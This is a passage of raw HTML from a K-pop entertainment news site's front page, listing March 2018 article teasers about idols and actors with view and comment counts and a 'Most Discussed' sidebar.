<i class="fa fa-comment-o"></i> 14
</div>
</div>
</article>
<article class='default ad-space list' style='padding: 25px 0;border-bottom: 1px solid #CCC;'>
<div id='div-gpt-ad-1456251248648-3' style='width:640px;text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456251248648-3'); });
            </script>
</div></article> <article class="list">
<div class="image">
<a href='/article/2018/03/netizens-ask-are-all-min-suks-of-the-world-cutie-pies' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17024322/Xiumin-kim-min-suk-onf-melomance.jpg' style="max-width:1000px;width:200px;height:140px" alt='Xiumin,kim-min-suk,oh-min-suk,onf,melomance' title='Xiumin,kim-min-suk,oh-min-suk,onf,melomance'></a> </div>
<div class="text">
<h2>
<a href='/category/Gossip' target='_self' class='' style=''>Gossip</a>, <a href='/category/LOL' target='_self' class='' style=''>LOL</a> </h2>
<h1><a href='/article/2018/03/netizens-ask-are-all-min-suks-of-the-world-cutie-pies' target='_self' class='' style=''>Netizens ask, 'Are all 'Min Suk's of the world cutie pies?'</a></h1>
<p>How many 'Min Suk's do you know?
Netizens have compiled a list of popular 'Min Suk's in and out of the entertainment industry, and they've arrived at…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521269959">8 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 7,340&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,032&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 10
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/actor-kim-kang-woo-says-he-will-never-let-his-children-act' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17014953/misc.jpg' style="max-width:1000px;width:200px;height:140px" alt='misc' title='misc'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/actor-kim-kang-woo-says-he-will-never-let-his-children-act' target='_self' class='' style=''>Actor Kim Kang Woo says he will never let his children act</a></h1>
<p>In a recent interview, Kim Kang Woo opened up about what it takes to be an actor. 
"Being an actor is having a very selfish occupation. You don't kno…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521269195">8 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 4,557&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 342&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 11
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/watch-show-music-core-live-with-comebacks-by-nct-127-got7-ikon-and-more' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17020230/misc.jpg' style="max-width:1000px;width:200px;height:140px" alt='misc' title='misc'></a> </div>
<div class="text">
<h2>
<a href='/category/Music-Releases' target='_self' class='' style=''>Music Releases</a> </h2>
<h1><a href='/article/2018/03/watch-show-music-core-live-with-comebacks-by-nct-127-got7-ikon-and-more' target='_self' class='' style=''>Watch 'Show! Music Core' Live with comebacks by NCT 127, GOT7, iKON, and more!</a></h1>
<p>'Show! Music Core' is back with the latest songs and performances by your favorite idols! This week,&nbsp;NCT 127, GOT7, iKON, UP10TION, and April wil…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521268132">8 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 3,999&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,075&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 5
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/kevin-park-ji-min-sit-down-for-dreamy-cover-of-rewrite-the-stars-from-the-greatest-showman' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16234804/Kevin-Kevin-park-ji-min.jpg' style="max-width:1000px;width:200px;height:140px" alt='Kevin,Kevin,park-ji-min' title='Kevin,Kevin,park-ji-min'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/kevin-park-ji-min-sit-down-for-dreamy-cover-of-rewrite-the-stars-from-the-greatest-showman' target='_self' class='' style=''>Kevin & Park Ji Min sit down for dreamy cover of 'Rewrite the Stars' from 'The Greatest Showman'</a></h1>
<p>'After School Club' buddies Kevin and 15&amp;'s Park Ji Min sat down for a dreamy cover of "Rewrite the Stars"!The song is originally an OST from Holl…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521266179">9 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 3,421&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 825&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 9 
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/park-so-hyun-wishes-to-retire-after-she-gets-married' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16210327/park-so-hyun.jpg' style="max-width:1000px;width:200px;height:140px" alt='park-so-hyun' title='park-so-hyun'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/park-so-hyun-wishes-to-retire-after-she-gets-married' target='_self' class='' style=''>Park So Hyun wishes to retire after she gets married</a></h1>
<p>Entertainer&nbsp;Park So Hyun expressed her thoughts on retiring after marriage.
The show 'First Experience Operation Team: First Time After Birth' (…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521264585">9 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 3,400&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 319&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 4
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/watch-victorias-chic-moves-in-a-dance-practice-clip-for-her-solo-pre-release-roof-on-fire' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17003228/Victoria.jpg' style="max-width:1000px;width:200px;height:140px" alt='Victoria' title='Victoria'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/watch-victorias-chic-moves-in-a-dance-practice-clip-for-her-solo-pre-release-roof-on-fire' target='_self' class='' style=''>Watch Victoria's chic moves in a dance practice clip for her solo pre-release 'Roof on Fire'</a></h1>
<p>Victoria is slaying with her solo pre-release track, "Roof on Fire". The idol has now released a full dance practice clip of her latest single, showca…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521264180">9 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 5,863&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 364&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 11
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/sf9s-chani-laments-how-he-cant-join-late-night-schedules-for-being-underaged' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17003432/sf9.jpg' style="max-width:1000px;width:200px;height:140px" alt='sf9' title='sf9'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a>, <a href='/category/AWW' target='_self' class='' style=''>AWW</a> </h2>
<h1><a href='/article/2018/03/sf9s-chani-laments-how-he-cant-join-late-night-schedules-for-being-underaged' target='_self' class='' style=''>SF9's Chani laments how he can't join late-night schedules for being underaged</a></h1>
<p>SF9's maknae Chani&nbsp;is sad that he can't join his hyungs!On March 17, SF9 guested on SBS Love FM's 'Song Eun Yi and Kim Sook Unnies' Radio'.&nbsp;…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521262835">10 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 4,039&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 689&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 3
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/park-hae-jin-talks-about-his-record-breaking-five-hour-long-fan-meetings' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16232814/park-hae-jin.jpg' style="max-width:1000px;width:200px;height:140px" alt='park-hae-jin' title='park-hae-jin'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/park-hae-jin-talks-about-his-record-breaking-five-hour-long-fan-meetings' target='_self' class='' style=''>Park Hae Jin talks about his record-breaking, five hour long fan meetings</a></h1>
<p>On the March 16 broadcast of 'Entertainment Weekly,' actor Park Hae Jin held a guerilla date on the streets.
The reporter mentioned the fact that the…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521262591">10 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 4,054&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 637&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 3
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/wanna-one-reveal-a-hilarious-dance-practice-clip-of-ipu-for-the-mv-surpassing-3333333-views' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17001521/wanna-one.jpg' style="max-width:1000px;width:200px;height:140px" alt='wanna-one' title='wanna-one'></a> </div>
<div class="text">
<h2>
<a href='/category/Music-Releases' target='_self' class='' style=''>Music Releases</a> </h2>
<h1><a href='/article/2018/03/wanna-one-reveal-a-hilarious-dance-practice-clip-of-ipu-for-the-mv-surpassing-3333333-views' target='_self' class='' style=''>Wanna One reveal a hilarious dance practice clip of 'I.P.U' for the MV surpassing 3,333,333 views</a></h1>
<p>As promised, Wanna One brought out their very special thank you gift to fans - a hilarious dance practice clip of "I.P.U"!
Previously, the group hint…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521260622">10 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 3,651&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,515&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 12
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/park-shin-hye-announces-the-premiere-date-of-little-house-in-the-forest-with-cute-audio-teaser' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16224834/So-Ji-Sub-park-shin-hye.jpg' style="max-width:1000px;width:200px;height:140px" alt='So-Ji-Sub,park-shin-hye' title='So-Ji-Sub,park-shin-hye'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/park-shin-hye-announces-the-premiere-date-of-little-house-in-the-forest-with-cute-audio-teaser' target='_self' class='' style=''>Park Shin Hye announces the premiere date of 'Little House in the Forest' with cute audio teaser!</a></h1>
<p>Park Shin Hye has turned into test-subject 'A' for her new reality show, 'Little House in the Forest'!In the first audio teaser for the new tvN progra…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521260258">10 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 4,143&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 397&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 1
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/korean-national-female-curling-team-cant-hide-their-excitement-after-a-phone-call-with-kang-daniel' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16214724/wanna-one.jpg' style="max-width:1000px;width:200px;height:140px" alt='SHINee,Taemin,wanna-one,kang-daniel' title='SHINee,Taemin,wanna-one,kang-daniel'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a>, <a href='/category/LOL' target='_self' class='' style=''>LOL</a> </h2>
<h1><a href='/article/2018/03/korean-national-female-curling-team-cant-hide-their-excitement-after-a-phone-call-with-kang-daniel' target='_self' class='' style=''>Korean national female curling team can't hide their excitement after a phone call with Kang Daniel</a></h1>
<p>Yes, they are the real 'winners' of the game.
After a successful performance during the '2018 PyeongChang Winter Olympic Games,' the much-hyped femal…</p>
<div class="info">
KayRosa&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521258724">11 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 12,381&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,653&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 11
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/ncts-taeyong-ten-say-baby-dont-stop-in-new-dance-practice-clip' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/16230527/taeyong-ten-nct.jpg' style="max-width:1000px;width:200px;height:140px" alt='taeyong,ten,nct' title='taeyong,ten,nct'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/ncts-taeyong-ten-say-baby-dont-stop-in-new-dance-practice-clip' target='_self' class='' style=''>NCT's Taeyong & Ten say 'Baby Don't Stop' in new dance practice clip</a></h1>
<p>NCT's Taeyong and Ten treated fans to the full dance practice clip of "Baby Don't Stop"!Through their official SNS, NCT thanked fans for the "Baby Don…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521258225">11 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 4,711&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,561&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 11
</div>
</div>
</article>

<link rel="stylesheet" type="text/css" href="https://www.allkpop.com/plugin/pagination/css/pagination.css">


<div id="pagination_id" class="full-width" style="text-align: center;"></div>
<script async type="text/javascript" src="https://www.allkpop.com/js/jquery.bootpag.min.js"></script>
<script>var ad_flag='home';var tab_flag='latest';var pagination_level='1';var total_cnt=7333;var current_page_num=1;var keyword='';</script>
<script async type="text/javascript" src="https://www.allkpop.com/plugin/pagination/js/pagination.js?v=1"></script>
</div>
<div id="article-headline-right">
<div style="float: left;width: 100%;text-align: center;">
<section class='ad-space' style='padding: 25px 0;border-bottom: 1px solid #CCC;'>
<div id='div-gpt-ad-1456251248648-4' style='text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456251248648-4'); });
            </script>
</div></section> </div>
<div style="width:100%;float:left">
<article class="list" style="border: none;padding-bottom:0px;padding-top: 0.83em;">
<nav class="" style="margin-bottom: 0;">
<ol class="options" style="width: 100%;">
<li class="identifier" style="font-size: 1.5em;width:96%;color:#7c7c7c!important;text-align: left;">Most Discussed <a href="https://www.allkpop.com/most_discussed" class="shop_identifier float-right" style="margin-top: 3px;">View More</a></li>
<li class="md_today" style="font-size: 1em;margin-right: 5px;">Today<span></span></li>
<li class="md_week" style="font-size: 1em;margin-right: 5px;">This Week<span></span></li>
<li class="md_month" style="font-size: 1em;">This Month<span></span></li>
</ol>
</nav>
</article>
<article id="article-category-spotlight" class="md_container md_today_container" style="text-align:left;padding-top: 0px;">
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16112809/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts' target='_self' class='' style=''>Meghan Trainor confesses her love for K-Pop and favorite boy group BTS</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521214500">23 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 42,880&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 19,261&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 441 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/black-pink-is-fierce-in-black-and-white-for-their-japanese-repackage-album-re-black-pink' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16124515/black-pink.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='black-pink' title='black-pink'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/black-pink-is-fierce-in-black-and-white-for-their-japanese-repackage-album-re-black-pink' target='_self' class='' style=''>Black Pink is fierce in black and white for their Japanese repackage album 'Re: Black Pink'</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521221109">21 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 14,493&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 4,873&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 173 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/listen-to-a-snippet-of-bts-first-ever-ost-dont-leave-me' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16165519/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/listen-to-a-snippet-of-bts-first-ever-ost-dont-leave-me' target='_self' class='' style=''>Listen to a snippet of BTS' first-ever OST 'Don't Leave Me'</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521235244">17 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 30,514&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 15,197&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 155 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/loona-reveals-12th-member-olivia-hye' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16111229/loona.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='loona,olivia-hye' title='loona,olivia-hye'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/loona-reveals-12th-member-olivia-hye' target='_self' class='' style=''>LOONA reveals 12th member Olivia Hye </a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521213548">23 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 12,054&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 893&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 137 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/kang-daniel-is-the-top-ranked-boy-group-member-in-brand-values-for-march-big-bang-take-up-2nd-5th' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16213626/Taeyang-G-Dragon-kang-daniel.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel' title='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/kang-daniel-is-the-top-ranked-boy-group-member-in-brand-values-for-march-big-bang-take-up-2nd-5th' target='_self' class='' style=''>Kang Daniel is the top ranked boy group member in brand values for March + Big Bang take up 2nd-5th</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521253860">12 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 11,359&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 3,513&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 123 </div>
</div>
</article>
</article>
<article id="article-category-spotlight" class="md_container md_week_container" style="text-align:left;padding-top: 0px;">
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/red-velvets-joy-is-receiving-criticism-for-poor-acting-on-great-temptation' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/13161226/joy.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='joy' title='joy'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/red-velvets-joy-is-receiving-criticism-for-poor-acting-on-great-temptation' target='_self' class='' style=''>Red Velvet's Joy is receiving criticism for 'poor acting' on 'Great Temptation'</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1520974870">4 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 106,212&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 7,277&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 841 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/ft-islands-jonghun-says-he-wants-to-talk-about-skin-whitening-with-seolhyun-because-she-has-dark-skin' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/14001032/AOA-Seolhyun-FT-Island-Jonghun.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='AOA,Seolhyun,FT-Island,Jonghun' title='AOA,Seolhyun,FT-Island,Jonghun'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/ft-islands-jonghun-says-he-wants-to-talk-about-skin-whitening-with-seolhyun-because-she-has-dark-skin' target='_self' class='' style=''>F.T. Island's Jonghun says he wants to talk about 'skin whitening' with Seolhyun because she has dark skin</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521004902">3 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 50,167&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 2,468&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 546 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/bts-also-snatches-up-best-boy-band-at-the-2018-iheartradio-music-awards' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/11221204/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/bts-also-snatches-up-best-boy-band-at-the-2018-iheartradio-music-awards' target='_self' class='' style=''>BTS also snatches up Best Boy Band at the 2018 iHeartRadio Music Awards</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1520820840">6 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 43,529&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 24,091&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 470 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/16112809/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts' target='_self' class='' style=''>Meghan Trainor confesses her love for K-Pop and favorite boy group BTS</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521214500">23 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 42,880&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 19,261&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 441 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/professional-wrestler-john-cena-confirms-hes-an-army-for-bts' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/14160921/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/professional-wrestler-john-cena-confirms-hes-an-army-for-bts' target='_self' class='' style=''>Professional wrestler John Cena confirms he's an ARMY for BTS</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521060420">3 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 64,694&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 26,560&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 403 </div>
</div>
</article>
</article>
<article id="article-category-spotlight" class="md_container md_month_container" style="text-align:left;padding-top: 0px;">
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/03/international-fans-say-they-are-offended-by-how-red-velvets-wendy-mimicked-black-girls-on-talk-mon' target='_self' class='embed_on' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/03/af/05115922/wendy.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='wendy' title='wendy'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/03/international-fans-say-they-are-offended-by-how-red-velvets-wendy-mimicked-black-girls-on-talk-mon' target='_self' class='' style=''>International fans say they are offended by how Red Velvet's Wendy 'mimicked' Black girls on 'Talk Mon'</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1520270647">12 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 141,303&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 5,259&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 5,231 </div>
</div>
</article>
 <article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/02/producer-marz-who-works-with-sm-entertainment-artists-belittles-bts-and-their-fans' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/02/af/24214331/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/02/producer-marz-who-works-with-sm-entertainment-artists-belittles-bts-and-their-fans' target='_self' class='' style=''>Producer Marz, who works with SM Entertainment artists, belittles BTS and their fans?</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1519530416">20 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 155,237&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 18,823&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 4,236 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/02/bts-revealed-to-have-been-approached-to-perform-at-the-olympics-closing-ceremony' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/02/af/26224504/bts.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='bts' title='bts'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/02/bts-revealed-to-have-been-approached-to-perform-at-the-olympics-closing-ceremony' target='_self' class='' style=''>BTS revealed to have been approached to perform at the Olympics Closing Ceremony</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1519703920">18 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 114,863&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 28,740&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 2,780 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/02/bts-jin-scientifically-proven-to-be-worldwide-handsome' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/02/af/17133543/jin.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='jin,jin,jin' title='jin,jin,jin'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/02/bts-jin-scientifically-proven-to-be-worldwide-handsome' target='_self' class='' style=''>BTS' Jin scientifically proven to be 'Worldwide Handsome' </a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1518893121">28 days ago</span>&nbsp;&nbsp;
